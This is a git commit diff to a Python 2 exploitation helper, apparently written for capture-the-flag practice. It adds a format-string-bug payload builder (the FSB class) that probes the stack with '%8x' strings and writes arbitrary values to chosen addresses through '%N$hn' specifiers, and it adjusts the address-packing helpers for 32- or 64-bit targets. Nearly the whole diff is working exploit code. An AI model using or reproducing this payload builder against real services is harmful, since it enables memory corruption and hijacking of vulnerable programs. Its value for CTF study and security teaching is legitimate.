c38deedd0f6e0f185945ddcd3911d4f213211dbf
satos---jp <syogo8118@yahoo.co.jp>
2016-11-18 08:01:41 -0800

    added_FSB_class

--- pwnscript.py
+++ pwnscript.py
@@ -10,7 +10,7 @@ import time
 
 
 isgaibu = False
-isgaibu = True
+#isgaibu = True
 
 sock = socket(AF_INET, SOCK_STREAM)
 if isgaibu:
@@ -22,9 +22,11 @@ else:
 	raw_input('gdb$')
 
 
+size_t = 0x4 #x64かx86か。sizeof(void*) の値で。
+
 def addr2s(x):
 	res = ""
-	for i in xrange(4):
+	for i in xrange(size_t):
 		res += chr(x % 256)
 		x /= 256
 	return res
@@ -34,9 +36,9 @@ def s2hex(s):
 	
 def s2addr(s):
 	res = 0
-	for i in xrange(4):
+	for i in xrange(size_t):
 		res *= 256
-		res += ord(s[3-i])
+		res += ord(s[size_t-i-1])
 	return res
 	
 def shell():
@@ -63,4 +65,45 @@ def getshellc(fn):
 	print map(ord,res)
 	return res
 
+
+class FSB:
+	def check_diff(sl):
+		#return ''.join(map(lambda p: '%0x' + chr(p+ord('A')) , xrange(15)))
+		return '%8x,' *  15
+		#0x25,0x30,0x78,0x2c なので、そのへんを探す。
+	def init(sl,kome,bytm,paynum,yet):
+		#たとえば、deadbeef,cafebabe,abcd9876,3025cafe, ... なら、
+		#fsb.init(kome=3,bytm=2,paynum=,yet=) で。
+
+		sl.kome = kome
+		sl.head = '*' * bytm
+		#%hnでやっていきます
+		sl.yet = yet + paynum * size_t * (size_t / 2) + bytm
+		print 'yet .. ',sl.yet
+		print yet
+		#payloadは、yetとpaynum分ずれて出る。
+		sl.data = []
+		sl.npn = 0
+	def add(sl,addr,val): #addrをvalにする
+		
+		for i in xrange(size_t/2): #x86なら2,x64なら4
+			sl.head += addr2s(addr + i*2)
+			sl.data.append((val % 0x10000, '%%%d$hn' % (sl.npn + sl.kome + 2)))
+			val /= 0x10000
+			sl.npn += 1
+		#短い順にソートすることにより、ペイロードを短くする
+		
+	def get(sl):
+		res = sl.head
+		ny = sl.yet
+		data = sorted(sl.data)
+		for ty,s in data:
+			dy = ((ty-ny + 0x10000) % 0x10000)
+			if dy>0:
+				res += '%%%dx' % dy
+			res += s
+			ny = ty
+		#print len(sl.head)
+		#print s2hex(sl.head)
+		return res
 
